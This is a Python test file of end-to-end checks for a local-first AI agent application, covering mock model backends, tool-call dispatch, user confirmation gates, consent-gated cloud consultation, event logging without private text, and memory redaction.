"""End-to-end tests for the P0a application loop."""

from __future__ import annotations

import subprocess
import sys
import tomllib
from copy import deepcopy
from dataclasses import dataclass, field, replace
from pathlib import Path

import pytest

from src.core.interfaces import RuntimeEventSink, ToolBackend
from src.core.schemas import (
    AdvisoryResult,
    CloudRequestPackage,
    ContextCandidate,
    IntentCandidate,
    LocalMindError,
    MinimalContext,
    NextAction,
    PreflightReport,
    Result,
    RuntimeEvent,
    ToolCallDraft,
    ToolDef,
)
from src.models.mock_backend import MockModelBackend

_DEFAULT_CONFIG = Path(__file__).parents[1] / "config" / "p6_legacy.example.toml"
_OLLAMA_CONFIG = Path(__file__).parents[1] / "config" / "ollama.example.toml"


@dataclass
class RecordingEventSink:
    events: list[RuntimeEvent] = field(default_factory=list)

    def emit(self, event: RuntimeEvent) -> None:
        self.events.append(event)


@dataclass
class RecordingCloudGateway:
    result: AdvisoryResult
    calls: list[CloudRequestPackage] = field(default_factory=list)
    denials: list[tuple[str, str, str]] = field(default_factory=list)

    def execute_cloud_turn(
        self, package: CloudRequestPackage, grant: object, task_id: str, intent_id: str, turn: int
    ) -> AdvisoryResult:
        del grant, task_id, intent_id, turn
        self.calls.append(package)
        return self.result

    def record_denial(self, task_id: str, session_id: str, reason: str) -> None:
        self.denials.append((task_id, session_id, reason))


@dataclass
class SequencedCloudGateway:
    results: list[AdvisoryResult]
    calls: list[CloudRequestPackage] = field(default_factory=list)
    denials: list[tuple[str, str, str]] = field(default_factory=list)

    def execute_cloud_turn(
        self, package: CloudRequestPackage, grant: object, task_id: str, intent_id: str, turn: int
    ) -> AdvisoryResult:
        del grant, task_id, intent_id, turn
        self.calls.append(package)
        return self.results.pop(0)

    def record_denial(self, task_id: str, session_id: str, reason: str) -> None:
        self.denials.append((task_id, session_id, reason))


@dataclass
class PartiallyFailingCloudGateway:
    first_result: AdvisoryResult
    calls: list[CloudRequestPackage] = field(default_factory=list)
    denials: list[tuple[str, str, str]] = field(default_factory=list)

    def execute_cloud_turn(
        self, package: CloudRequestPackage, grant: object, task_id: str, intent_id: str, turn: int
    ) -> AdvisoryResult:
        del grant, task_id, intent_id, turn
        self.calls.append(package)
        if len(self.calls) == 1:
            return self.first_result
        raise LocalMindError("CLOUD_UNAVAILABLE", "transport failed", "云端服务暂不可用，请稍后重试。")

    def record_denial(self, task_id: str, session_id: str, reason: str) -> None:
        self.denials.append((task_id, session_id, reason))


@dataclass
class FailingCloudGateway:
    denials: list[tuple[str, str, str]] = field(default_factory=list)

    def execute_cloud_turn(
        self, package: CloudRequestPackage, grant: object, task_id: str, intent_id: str, turn: int
    ) -> AdvisoryResult:
        del package, grant, task_id, intent_id, turn
        raise LocalMindError("CLOUD_UNAVAILABLE", "transport failed", "云端服务暂不可用，请稍后重试。")

    def record_denial(self, task_id: str, session_id: str, reason: str) -> None:
        self.denials.append((task_id, session_id, reason))


class SequencedMockModelBackend(MockModelBackend):
    def __init__(self, structured_responses: list[dict], text_response: str = "") -> None:
        super().__init__(text_response=text_response)
        self._structured_responses = structured_responses

    def generate(self, prompt: str, response_schema: dict | None = None) -> dict:
        if response_schema is not None:
            self._ensure_loaded("generate")
            return deepcopy(self._structured_responses.pop(0))
        return super().generate(prompt, response_schema)


class _CountingMockModel(MockModelBackend):
    def __init__(self, response: dict) -> None:
        super().__init__(structured_response=response)
        self.generate_calls = 0

    def generate(self, prompt: str, response_schema: dict | None = None) -> dict:
        self.generate_calls += 1
        return super().generate(prompt, response_schema)


@dataclass
class HighImpactToolBackend(ToolBackend):
    risk_level: str
    calls: list[tuple[str, dict]] = field(default_factory=list)

    def list_tools(self) -> list[ToolDef]:
        return [ToolDef(
            "system.echo",
            "Echo a message.",
            {
                "type": "object",
                "properties": {"message": {"type": "string"}},
                "required": ["message"],
            },
        )]

    def preflight(self, tool_name: str, params: dict) -> PreflightReport:
        del tool_name, params
        return PreflightReport(
            effective_risk=self.risk_level,
            requires_confirmation=self.risk_level == "sensitive",
            target_exists=False,
            target_key="cluster-primary",
            reason="high_impact_test",
            approval_profile="high_impact",
        )

    def execute(self, tool_name: str, params: dict) -> Result[dict]:
        self.calls.append((tool_name, params))
        return Result.ok({"message": "unexpected"})


def _ready_model(
    *,
    tool_name: str = "system.echo",
    entities: dict | None = None,
) -> MockModelBackend:
    return MockModelBackend(
        structured_response={
            "state": "READY",
            "intent_type": "echo_message",
            "entities": entities or {"message": "你好"},
            "missing_info": [],
            "suggested_tools": [tool_name],
            "tool_intent": "local_action",
            "tool_call": {"tool_name": tool_name, "arguments": entities or {"message": "你好"}},
            "risk_draft": "normal",
            "model_confidence": 0.9,
            "reasoning": "P0a integration test.",
        }
    )


def _pending_cloud_app(
    event_sink: RuntimeEventSink | None = None,
    *,
    request: str = "分析这个架构",
    session_id: str = "cloud-session",
):
    from src.core.cloud_advisory import CloudAdvisoryService
    from src.main import bootstrap

    model = SequencedMockModelBackend([
        {
            "state": "READY", "intent_type": "analysis", "entities": {}, "missing_info": [],
            "suggested_tools": [], "risk_draft": "normal", "model_confidence": 0.9,
            "consultation_proposal": {
                "should_consult": True, "escalation_reason": "architecture_tradeoff",
                "expected_benefit": 0.9,
            },
        },
        {
            "state": "VAGUE", "intent_type": "unknown", "entities": {}, "missing_info": [],
            "suggested_tools": [], "risk_draft": "normal", "model_confidence": 0.0,
        },
    ])
    app = bootstrap(
        str(_DEFAULT_CONFIG),
        model_backend_override=model,
        event_sink_override=event_sink,
    )
    app.cloud_enabled = True
    gateway = RecordingCloudGateway(AdvisoryResult(analysis="unused"))
    app.cloud_service = CloudAdvisoryService(gateway=gateway)
    assert "确认" in app.handle(request, session_id=session_id)
    return app, gateway


def test_cloud_authorization_required_reports_zero_outbound_bytes() -> None:
    sink = RecordingEventSink()

    _pending_cloud_app(sink)

    authorization = next(
        event
        for event in sink.events
        if event.stage == "cloud_consult"
        and event.data["phase"] == "authorization_required"
    )
    assert authorization.data["authorization"] == "pending"
    assert authorization.data["outbound_bytes"] == 0


def test_cloud_authorization_preview_is_not_memory_but_terminal_reply_is_written_once() -> None:
    app, _ = _pending_cloud_app()
    assert not hasattr(app._pending_cloud, "topic_label")
    assert not hasattr(app._pending_cloud, "intent_type")
    reintegration_model = MockModelBackend(
        structured_response={
            "state": "READY",
            "intent_type": "analysis",
            "entities": {},
            "missing_info": [],
            "suggested_tools": [],
            "risk_draft": "normal",
            "model_confidence": 0.9,
        },
        text_response="本地整合结论。",
    )
    reintegration_model.load()
    app.resolver.model = reintegration_model

    assert len(app.memory._chunks) == 0  # type: ignore[attr-defined]
    assert app._topic_turn_counts == {}

    reply = app.handle("/cloud allow", session_id="cloud-session")

    chunks = app.memory._chunks  # type: ignore[attr-defined]
    assert len(chunks) == 1
    assert "User: 分析这个架构" in chunks[0].text
    assert "Assistant: [云端建议，经本地整合] " in chunks[0].text
    assert reply in chunks[0].text
    assert sum(app._topic_turn_counts.values()) == 1


def test_long_task_brief_reaches_authorization_then_reintegrates_the_exact_previewed_package() -> None:
    """A8: a long S07-shaped task stays intact through authorization and local return."""

    from src.core.cloud_advisory import CloudAdvisoryService
    from src.main import bootstrap

    long_task = (
        "请基于以下三段材料做一次发布决策综述。材料一：过去七天网关错误率百分之零点二，"
        "高峰延迟偏高，数据库连接池在夜间批处理时段打满。材料二：本周已上线搜索服务与"
        "结算服务，其中结算改动了扣款重试逻辑，尚未经过大促流量验证。材料三：大促期间"
        "禁止非灰度发布，客服人力只够支撑一次回滚。任务：给出周五是否发布的明确结论、"
        "两个主要风险与对应缓解措施，以及灰度发布和回滚步骤。"
    )
    assert len(long_task.encode("utf-8")) > 400
    model = SequencedMockModelBackend(
        [
            {
                "state": "READY",
                "intent_type": "analysis",
                "entities": {},
                "missing_info": [],
                "suggested_tools": [],
                "risk_draft": "normal",
                "model_confidence": 0.9,
                "consultation_proposal": {
                    "should_consult": True,
                    "escalation_reason": "reasoning_complexity",
                    "expected_benefit": 0.9,
                },
            },
            {
                "state": "READY",
                "intent_type": "analysis",
                "entities": {},
                "missing_info": [],
                "suggested_tools": [],
                "risk_draft": "normal",
                "model_confidence": 0.9,
            },
        ],
        text_response="本地整合后的发布建议。",
    )
    sink = RecordingEventSink()
    app = bootstrap(
        str(_DEFAULT_CONFIG), model_backend_override=model, event_sink_override=sink
    )
    app.cloud_enabled = True
    gateway = RecordingCloudGateway(AdvisoryResult(analysis="云端分析结果。"))
    app.cloud_service = CloudAdvisoryService(gateway=gateway)

    assert "确认" in app.handle(f"/cloud ask {long_task}", session_id="s07-session")
    pending = app._pending_cloud
    assert pending is not None
    assert [(item.label, item.value) for item in pending.preparation.candidates] == [
        ("brief_goal", long_task)
    ]
    authorization = next(
        event
        for event in sink.events
        if event.stage == "cloud_consult" and event.data["phase"] == "authorization_required"
    )
    assert authorization.data["outbound_bytes"] == 0

    assert app.handle("/cloud allow", session_id="s07-session") == "本地整合后的发布建议。"
    assert len(gateway.calls) == 1
    assert [
        (item.category, item.label, item.value, item.redacted)
        for item in gateway.calls[0].context_items
    ] == [
        (item.category, item.label, item.value, item.redacted)
        for item in pending.preparation.candidates
    ]
    assert any(event.stage == "cloud_return" for event in sink.events)


def test_bootstrap_runs_mock_echo_loop_and_records_memory_and_audit() -> None:
    from src.main import bootstrap

    app = bootstrap(str(_DEFAULT_CONFIG), model_backend_override=_ready_model())

    reply = app.handle("请回显一句话", session_id="session-1", project_id="project-1")

    assert reply == "[0] system.echo：message: 你好"
    memory = app.memory.retrieve("回显", top_k=1, project_id="project-1")
    assert memory.is_ok is True
    assert memory.value is not None
    assert "Assistant: 执行结果 1 条，已以结构化记录留存。" in memory.value[0].text
    assert "[0] system.echo：message: 你好" not in memory.value[0].text
    assert "[tool] name=system.echo" in memory.value[0].text
    assert memory.value[0].metadata["project_id"] == "project-1"
    assert len(app.executor.audit_log) == 1
    assert app.executor.audit_log[0].verdict == "allowed"


@pytest.mark.parametrize(
    ("tool_call", "expected_resolution", "expected_reason"),
    [
        (None, "absent", "tool_call_missing"),
        (
            {"tool_name": "file.delete", "arguments": {"path": "notes.txt"}},
            "unknown_tool",
            "unknown_tool",
        ),
    ],
)
def test_local_action_without_usable_draft_is_explicitly_unfulfilled(
    tmp_path: Path,
    tool_call: dict | None,
    expected_resolution: str,
    expected_reason: str,
) -> None:
    from src.main import _TOOL_UNFULFILLED_REPLY, bootstrap

    sink = RecordingEventSink()
    model = _CountingMockModel(
        {
            "state": "READY",
            "intent_type": "file_operation",
            "entities": {},
            "missing_info": [],
            "suggested_tools": ["file.write"],
            "risk_draft": "normal",
            "model_confidence": 0.9,
            "tool_intent": "local_action",
            "tool_call": tool_call,
        }
    )
    app = bootstrap(
        str(_DEFAULT_CONFIG),
        model_backend_override=model,
        event_sink_override=sink,
    )
    app.executor.tool_backend._workspace_root = tmp_path  # type: ignore[attr-defined]

    reply = app.handle("operate on notes.txt", "tool-missing")

    assert reply == _TOOL_UNFULFILLED_REPLY
    assert model.generate_calls == 1
    assert app._pending_plan is None
    assert list(tmp_path.iterdir()) == []
    assert app.last_turn_report()["reason"] == expected_reason
    assert app.last_turn_report()["tool_call_resolution"] == expected_resolution
    assert app.last_turn_report()["reply_provenance"] == "unfulfilled"
    assert not any(event.stage == "tool_execution" for event in sink.events)


@pytest.mark.parametrize(
    "arguments",
    [
        {"path": 123},
        {"path": "notes.txt", "unexpected": True},
    ],
)
def test_invalid_tool_arguments_use_closed_dispatch_reason(
    tmp_path: Path,
    arguments: dict,
) -> None:
    from src.main import _TOOL_UNFULFILLED_REPLY, bootstrap

    sink = RecordingEventSink()
    model = MockModelBackend(
        structured_response={
            "state": "READY",
            "intent_type": "read_file",
            "entities": {},
            "missing_info": [],
            "suggested_tools": [],
            "risk_draft": "normal",
            "model_confidence": 0.9,
            "tool_intent": "local_action",
            "tool_call": {"tool_name": "file.read", "arguments": arguments},
        }
    )
    app = bootstrap(
        str(_DEFAULT_CONFIG),
        model_backend_override=model,
        event_sink_override=sink,
    )
    app.executor.tool_backend._workspace_root = tmp_path  # type: ignore[attr-defined]

    assert app.handle("读取文件", "invalid-tool-arguments") == _TOOL_UNFULFILLED_REPLY

    dispatch = next(event.data for event in sink.events if event.stage == "dispatch_decision")
    assert dispatch["action"] == "PLAN_LOCAL"
    assert dispatch["reason"] == "param_invalid"
    assert app.last_turn_report()["reply_provenance"] == "unfulfilled"


@pytest.mark.parametrize("risk_level", ["normal", "sensitive"])
def test_app_withholds_high_impact_plan_without_creating_confirmation(
    risk_level: str,
) -> None:
    from src.main import bootstrap

    app = bootstrap(str(_DEFAULT_CONFIG), model_backend_override=_ready_model())
    backend = HighImpactToolBackend(risk_level)
    app.executor.tool_backend = backend

    reply = app.handle("执行高影响测试操作", session_id="impact-session")

    assert "当前阶段不执行此类操作" in reply
    assert "工具：system.echo" in reply
    assert "目标：cluster-primary" in reply
    assert "如需继续，请回复" not in reply
    assert app._pending_plan is None
    assert backend.calls == []
    assert app.executor.audit_log is not None
    assert app.executor.audit_log[-1].reason == "high_impact_closed"

    confirmation_reply = app.handle("确认 test-passphrase", session_id="impact-session")
    assert confirmation_reply == "没有待确认操作。"
    assert backend.calls == []


def test_ollama_example_contains_all_sections_needed_by_the_interactive_cli() -> None:
    with _OLLAMA_CONFIG.open("rb") as stream:
        config = tomllib.load(stream)

    assert config["model_backend"]["type"] == "ollama"
    assert config["model_backend"]["config"]["model"] == "qwen3:4b"
    assert config["projects"]["auto_create"] is True
    assert config["tools"]["workspace_root"]
    assert "file.write" in config["tool_backend"]["config"]["whitelist"]
    assert config["observability"]["event_jsonl_path"] == ""
    assert config["cloud_advisory"]["enabled"] is True
    assert config["cloud_advisory"]["provider"] == "deepseek"
    assert config["cloud_advisory"]["connection"]["model"] == "deepseek-v4-flash"


def test_ready_intent_without_tools_returns_a_local_model_answer() -> None:
    from src.main import bootstrap

    model = MockModelBackend(
        text_response="你好，我是本地优先的个人智能体。",
        structured_response={
            "state": "READY",
            "intent_type": "conversation",
            "entities": {},
            "missing_info": [],
            "suggested_tools": [],
            "risk_draft": "normal",
            "model_confidence": 0.9,
            "reasoning": "Direct answer is sufficient.",
        },
    )
    app = bootstrap(str(_DEFAULT_CONFIG), model_backend_override=model)

    assert app.handle("介绍一下你自己", "session-chat") == "你好，我是本地优先的个人智能体。"


def test_handle_returns_user_message_for_blank_input() -> None:
    from src.main import bootstrap

    app = bootstrap(str(_DEFAULT_CONFIG), model_backend_override=_ready_model())

    assert app.handle("  ", session_id="session-1") == "输入不能为空。"


def test_handle_emits_ordered_runtime_events_and_one_completion() -> None:
    from src.main import bootstrap

    sink = RecordingEventSink()
    app = bootstrap(
        str(_DEFAULT_CONFIG),
        model_backend_override=_ready_model(),
        event_sink_override=sink,
        run_id_override="run-test",
    )

    assert app.handle("请回显一句话", session_id="session-events")

    stages = [event.stage for event in sink.events]
    assert stages[0] == "turn_started"
    assert stages.index("topic_decision") < stages.index("intent_final")
    assert stages.index("intent_final") < stages.index("dispatch_decision")
    assert stages.index("dispatch_decision") < stages.index("tool_execution")
    assert stages[-1] == "turn_completed"
    assert stages.count("turn_completed") == 1
    assert all(event.run_id == "run-test" for event in sink.events)
    assert [event.seq for event in sink.events] == sorted(event.seq for event in sink.events)
    assert app.last_turn_report() is not None
    assert app.last_turn_report()["action"] == "PLAN_LOCAL"
    dispatch = next(event.data for event in sink.events if event.stage == "dispatch_decision")
    assert dispatch["reference_guard_result"] in {"not_triggered", "triggered"}


def test_handle_records_structured_cloud_proposal_and_gate_outcome() -> None:
    from src.main import bootstrap

    sink = RecordingEventSink()
    model = MockModelBackend(
        text_response="本地回退回答",
        structured_response={
            "state": "READY",
            "intent_type": "architecture_analysis",
            "entities": {},
            "missing_info": [],
            "suggested_tools": [],
            "risk_draft": "normal",
            "model_confidence": 0.92,
            "consultation_proposal": {
                "should_consult": True,
                "escalation_reason": "architecture_tradeoff",
                "expected_benefit": 0.8,
                "proposed_question": "private task text must not be recorded",
            },
        },
    )
    app = bootstrap(
        str(_DEFAULT_CONFIG),
        model_backend_override=model,
        event_sink_override=sink,
    )

    assert app.handle("分析内部架构", "session-events") == "本地回退回答"

    intent = next(event.data for event in sink.events if event.stage == "intent_final")
    dispatch = next(event.data for event in sink.events if event.stage == "dispatch_decision")
    assert intent["proposal_present"] is True
    assert intent["should_consult"] is True
    assert intent["expected_benefit"] == 0.8
    assert intent["escalation_reason"] == "architecture_tradeoff"
    assert intent["risk_draft"] == "normal"
    assert intent["risk_draft_resolution"] == "declared"
    assert dispatch["proposal_gate_result"] == "vetoed"
    assert dispatch["proposal_denied_reason"] == "cloud_disabled"
    assert "private task text" not in repr((intent, dispatch, app.last_turn_report()))


def test_single_round_non_ready_intent_records_resolution_exhaustion_and_asks_user() -> None:
    from src.main import bootstrap

    sink = RecordingEventSink()
    model = SequencedMockModelBackend(
        [
            {
                "state": "PARTIAL",
                "intent_type": "training_plan",
                "entities": {},
                "missing_info": ["topic", "audience"],
                "suggested_tools": [],
                "risk_draft": "normal",
                "model_confidence": 0.3,
            }
        ]
    )
    app = bootstrap(
        str(_DEFAULT_CONFIG), model_backend_override=model, event_sink_override=sink
    )
    app.resolver.max_rounds = 1

    app.handle("请安排一次内部培训。", session_id="resolution-exhausted")

    intent = next(event.data for event in sink.events if event.stage == "intent_final")
    dispatch = next(event.data for event in sink.events if event.stage == "dispatch_decision")
    assert intent["resolution_exhausted"] is True
    assert dispatch["action"] == "ASK_USER"
    assert dispatch["reason"] == "resolution_exhausted"


def test_dangling_reference_guard_asks_user_without_mutating_model_result() -> None:
    from src.main import bootstrap

    sink = RecordingEventSink()
    app = bootstrap(
        str(_DEFAULT_CONFIG),
        model_backend_override=_ready_model(),
        event_sink_override=sink,
    )

    reply = app.handle("把那个服务发布上去。", session_id="reference-guard")

    dispatch = next(event.data for event in sink.events if event.stage == "dispatch_decision")
    intent = next(event.data for event in sink.events if event.stage == "intent_final")
    assert dispatch["action"] == "ASK_USER"
    assert dispatch["reason"] == "dangling_reference"
    assert dispatch["reference_guard_result"] == "triggered"
    assert "那个服务" in reply
    assert intent["final_state"] == "READY"
    assert intent["missing_info"] == ()


def test_force_cloud_records_triggered_reference_guard_without_being_preempted() -> None:
    from src.main import bootstrap

    sink = RecordingEventSink()
    model = MockModelBackend(
        structured_response={
            "state": "READY",
            "intent_type": "configuration_analysis",
            "entities": {},
            "missing_info": [],
            "suggested_tools": [],
            "risk_draft": "normal",
            "model_confidence": 0.9,
        }
    )
    app = bootstrap(
        str(_DEFAULT_CONFIG),
        model_backend_override=model,
        event_sink_override=sink,
    )
    app.cloud_enabled = True

    reply = app.handle(
        "/cloud ask 排查这份配置的鉴权失败原因：api_key=sk-EVAL-FAKE-000000-DEADBEEF。",
        session_id="reference-force-cloud",
    )

    dispatch = next(event.data for event in sink.events if event.stage == "dispatch_decision")
    assert dispatch["action"] == "REQUEST_CLOUD"
    assert dispatch["reference_guard_result"] == "triggered"
    assert reply


def test_reference_guard_reply_appends_marker_without_modifying_candidate() -> None:
    from src.core.reference_guard import ReferenceGuardResult
    from src.main import bootstrap

    app = bootstrap(str(_DEFAULT_CONFIG), model_backend_override=_ready_model())
    candidate = IntentCandidate(
        state="PARTIAL",
        intent_type="deployment",
        entities={"environment": "production"},
        missing_info=["目标服务"],
        suggested_tools=["system.echo"],
        tool_intent="local_action",
        tool_call=ToolCallDraft("system.echo", {"message": "execute through the tool chain"}),
        tool_call_resolution="resolved",
        risk_draft="normal",
        model_confidence=0.5,
    )
    original = deepcopy(candidate)

    reply = app._handle_action(
        candidate,
        MinimalContext(system_prompt="Resolve.", current_input="把那个服务发布上去。"),
        NextAction("ASK_USER", "dangling_reference"),
        "reference-reply",
        reference_guard=ReferenceGuardResult(True, "none", "那个服务\nignored"),
    )

    assert candidate == original
    assert reply.startswith("请补充以下信息：目标服务\n")
    assert reply.endswith("请说明“那个服务 ignored”具体指什么。")


def test_guard_triggered_event_carries_no_marker_text(tmp_path: Path) -> None:
    from src.main import bootstrap
    from src.observability.sinks import JsonlEventSink

    event_path = tmp_path / "events.jsonl"
    app = bootstrap(
        str(_DEFAULT_CONFIG),
        model_backend_override=_ready_model(),
        event_sink_override=JsonlEventSink(event_path),
    )

    app.handle("把那个服务发布上去。", session_id="reference-private")

    persisted = event_path.read_text(encoding="utf-8")
    assert '"reference_guard_result":"triggered"' in persisted
    assert "marker_text" not in persisted
    assert "那个服务" not in persisted


def test_no_progress_uses_conditional_local_reply_prompt() -> None:
    from src.main import bootstrap

    repeated = {
        "state": "ALMOST",
        "intent_type": "architecture_analysis",
        "entities": {"service": "gateway"},
        "missing_info": ["峰值流量"],
        "suggested_tools": [],
        "risk_draft": "normal",
        "model_confidence": 0.55,
    }

    class PromptRecordingModel(SequencedMockModelBackend):
        def __init__(self) -> None:
            super().__init__([dict(repeated), dict(repeated)], "条件化回答")
            self.text_prompts: list[str] = []

        def generate(self, prompt: str, response_schema: dict | None = None) -> dict:
            if response_schema is None:
                self.text_prompts.append(prompt)
            return super().generate(prompt, response_schema)

    model = PromptRecordingModel()
    sink = RecordingEventSink()
    app = bootstrap(
        str(_DEFAULT_CONFIG), model_backend_override=model, event_sink_override=sink
    )

    assert app.handle("分析网关架构", "conditional-session") == "条件化回答"

    assert app.last_turn_report()["action"] == "PLAN_LOCAL"
    assert app.last_turn_report()["reason"] == "local_conditional_answer"
    assert app.last_turn_report()["no_progress_detected"] is True
    assert app.last_turn_report()["stopped_early"] is True
    assert "采用的假设" in model.text_prompts[-1]
    assert "尚不确定的信息" in model.text_prompts[-1]
    assert "峰值流量" in model.text_prompts[-1]
    rounds = [event for event in sink.events if event.stage == "intent_round"]
    assert [event.data["new_memories"] for event in rounds] == [0, 0]


def test_nonempty_plan_cannot_return_as_conditional_local_reply() -> None:
    from src.main import bootstrap

    app = bootstrap(str(_DEFAULT_CONFIG), model_backend_override=_ready_model())
    candidate = IntentCandidate(
        state="ALMOST",
        intent_type="echo_message",
        entities={"message": "execute through the tool chain"},
        missing_info=["optional detail"],
        suggested_tools=["system.echo"],
        risk_draft="normal",
        model_confidence=0.6,
        tool_intent="local_action",
        tool_call=ToolCallDraft(
            "system.echo", {"message": "execute through the tool chain"}
        ),
        tool_call_resolution="resolved",
    )

    reply = app._handle_action(
        candidate,
        MinimalContext(
            system_prompt="Resolve.",
            current_input="echo it",
            tool_defs=tuple(app.executor.tool_backend.list_tools()),
        ),
        NextAction("PLAN_LOCAL", "local_conditional_answer"),
        "conditional-tool-session",
    )

    assert reply == "[0] system.echo：message: execute through the tool chain"
    assert len(app.executor.audit_log) == 1


def test_blank_input_still_emits_one_error_completion() -> None:
    from src.main import bootstrap

    sink = RecordingEventSink()
    app = bootstrap(
        str(_DEFAULT_CONFIG), model_backend_override=_ready_model(), event_sink_override=sink
    )

    assert app.handle("  ", session_id="session-events") == "输入不能为空。"

    completed = [event for event in sink.events if event.stage == "turn_completed"]
    assert len(completed) == 1
    assert completed[0].data["completion"] == "error"
    assert completed[0].data["error_code"] == "INVALID_INPUT"
    assert completed[0].data["final_action"] is None


def test_event_sink_failure_never_changes_the_reply() -> None:
    from src.main import bootstrap

    class FailingSink:
        def emit(self, event: RuntimeEvent) -> None:
            del event
            raise OSError("sink unavailable")

    app = bootstrap(
        str(_DEFAULT_CONFIG), model_backend_override=_ready_model(), event_sink_override=FailingSink()
    )

    assert app.handle("请回显一句话", session_id="session-events") == "[0] system.echo：message: 你好"


def test_cloud_authorization_turn_emits_cloud_lifecycle_without_advisory_text() -> None:
    app, _ = _pending_cloud_app()
    sink = RecordingEventSink()
    app.event_sink = sink

    app.handle("/cloud allow", session_id="cloud-session")

    cloud_events = [event for event in sink.events if event.stage.startswith("cloud_")]
    assert any(event.stage == "cloud_consult" for event in cloud_events)
    assert any(event.stage == "cloud_return" for event in cloud_events)
    assert "unused" not in repr([event.data for event in cloud_events])
    assert [event.stage for event in sink.events].count("turn_completed") == 1


def test_handle_requests_confirmation_for_sensitive_registered_tool(tmp_path: Path) -> None:
    from src.main import bootstrap

    sink = RecordingEventSink()
    app = bootstrap(
        str(_DEFAULT_CONFIG),
        model_backend_override=_ready_model(
            tool_name="file.read",
            entities={"path": "notes.txt"},
        ),
        event_sink_override=sink,
    )
    (tmp_path / "notes.txt").write_text("private", encoding="utf-8")
    app.executor.tool_backend._workspace_root = tmp_path  # type: ignore[attr-defined]

    reply = app.handle("读取 notes.txt", session_id="session-1")
    assert "file.read" in reply
    assert "确认" in reply
    assert "覆盖已存在文件" not in reply
    assert app.executor.audit_log == []
    dispatch = next(event for event in sink.events if event.stage == "dispatch_decision")
    assert dispatch.data["requires_user_confirmation"] is True


def test_bootstrap_rejects_invalid_intent_max_rounds(tmp_path: Path) -> None:
    from src.core.schemas import LocalMindError
    from src.main import bootstrap

    config_path = tmp_path / "invalid.toml"
    config_path.write_text(
        """
[model_backend]
type = "mock"

[memory_backend]
type = "in_memory"

[tool_backend]
type = "builtin_only"

[safety]
backend = "rule_only"

[cloud_advisory]
backend = "noop"

[evolution]
backend = "noop"

[execution]
intent_max_rounds = 5
""".strip(),
        encoding="utf-8",
    )

    try:
        bootstrap(str(config_path))
    except LocalMindError as exc:
        assert exc.code == "CONFIG_ERROR"
        assert exc.user_message == "系统配置有误，请检查 execution.intent_max_rounds。"
    else:
        raise AssertionError("bootstrap should reject intent_max_rounds outside 1..4")


def test_create_memory_backend_supports_sqlite(tmp_path: Path) -> None:
    from src.main import create_memory_backend
    from src.memory.sqlite_backend import SQLiteMemoryBackend

    backend = create_memory_backend(
        {
            "memory_backend": {
                "type": "sqlite",
                "config": {"db_path": str(tmp_path / "memory.db")},
            }
        }
    )

    assert isinstance(backend, SQLiteMemoryBackend)
    backend.close()


def test_create_memory_backend_passes_configured_forbidden_paths_to_memory_writes() -> None:
    from src.main import create_memory_backend

    backend = create_memory_backend(
        {
            "memory_backend": {"type": "in_memory", "config": {}},
            "safety": {"l1_rules": {"forbidden_paths": ["D:/private"]}},
        }
    )
    backend.store_episode("read D:/private/notes.txt", {"topic": "notes", "session_id": "s1"})

    result = backend.retrieve("read", project_id=None)

    assert result.value is not None
    assert result.value[0].text == "read [已脱敏:path]"


def test_create_memory_backend_constructs_ollama_embedding_for_sqlite(tmp_path: Path) -> None:
    from src.main import create_memory_backend
    from src.models.ollama_embedding import OllamaEmbeddingBackend

    backend = create_memory_backend(
        {
            "memory_backend": {
                "type": "sqlite",
                "config": {
                    "db_path": str(tmp_path / "memory.db"),
                    "embedding": {"type": "ollama", "model": "nomic-embed-text", "dim": 2},
                },
            }
        }
    )

    assert isinstance(backend._embedding, OllamaEmbeddingBackend)
    backend.close()


def test_p0a_demo_script_runs_from_project_root() -> None:
    result = subprocess.run(
        [sys.executable, "scripts/run_p0a.py"],
        cwd=Path(__file__).parents[1],
        check=False,
        capture_output=True,
        text=True,
    )

    assert result.returncode == 0, result.stderr
    assert result.stdout.strip() == "[0] system.echo：message: Hello LocalMind!"


def test_cloud_advisory_is_locally_integrated_not_directly_exposed() -> None:
    from src.core.cloud_advisory import CloudAdvisoryService
    from src.main import bootstrap

    model = SequencedMockModelBackend(
        [
            {
                "state": "READY",
                "intent_type": "analysis",
                "entities": {"target": "database", "raw": "must not send"},
                "missing_info": [],
                "suggested_tools": [],
                "risk_draft": "normal",
                "model_confidence": 0.9,
                "consultation_proposal": {
                    "should_consult": True, "escalation_reason": "architecture_tradeoff",
                    "expected_benefit": 0.9, "candidate_context": [
                        {"category": "user_entity", "label": "language", "value": "python"}
                    ],
                },
            },
            {
                "state": "READY",
                "intent_type": "analysis",
                "entities": {"target": "database"},
                "missing_info": [],
                "suggested_tools": [],
                "risk_draft": "normal",
                "model_confidence": 0.9,
            },
        ],
        text_response="本地整合后的建议。",
    )
    app = bootstrap(str(_DEFAULT_CONFIG), model_backend_override=model)
    app.cloud_enabled = True
    app.privacy_policy.mode = "convenient"
    gateway = RecordingCloudGateway(AdvisoryResult(analysis="Remote-only advice."))
    app.cloud_service = CloudAdvisoryService(gateway=gateway)

    prompt = app.handle("Analyze my private database", session_id="cloud-session")
    assert "确认" in prompt
    reply = app.handle("/cloud allow", session_id="cloud-session")

    assert reply == "本地整合后的建议。"
    assert reply != "Remote-only advice."
    assert len(gateway.calls) == 1
    assert gateway.calls[0].context_items[0].value == "python"


def test_cloud_reintegration_converges_when_the_local_resolution_budget_is_exhausted() -> None:
    """T14: cloud reintegration must not schedule a retrieval round that cannot run."""

    from src.core.control_policy import ControlPolicy
    from src.main import bootstrap

    class RecordingPolicy:
        def __init__(self) -> None:
            self._delegate = ControlPolicy()
            self.actions: list[NextAction] = []

        def decide(self, *args: object, **kwargs: object) -> NextAction:
            action = self._delegate.decide(*args, **kwargs)  # type: ignore[arg-type]
            self.actions.append(action)
            return action

    model = SequencedMockModelBackend(
        [
            {
                "state": "PARTIAL",
                "intent_type": "analysis",
                "entities": {},
                "missing_info": ["scope"],
                "suggested_tools": [],
                "risk_draft": "normal",
                "model_confidence": 0.3,
            }
        ],
        text_response="本地整理后仍需确认分析范围。",
    )
    app = bootstrap(str(_DEFAULT_CONFIG), model_backend_override=model)
    app.resolver.max_rounds = 1
    policy = RecordingPolicy()
    app.policy = policy  # type: ignore[assignment]
    context = MinimalContext(system_prompt="Resolve.", current_input="分析这个架构")

    reply = app._complete_cloud_consultation(
        context,
        AdvisoryResult(analysis="外部建议仅供本地参考。"),
        "task-reintegration",
        "session-reintegration",
    )

    assert policy.actions == [
        NextAction("ASK_USER", "resolution_exhausted", requires_user_confirmation=False)
    ]
    assert reply == "本地整理后仍需确认分析范围。"


def test_cloud_control_is_explicit_and_is_not_part_of_model_input() -> None:
    from src.main import _parse_cloud_control

    assert _parse_cloud_control("/cloud ask analyze Python") == (True, False, "analyze Python")
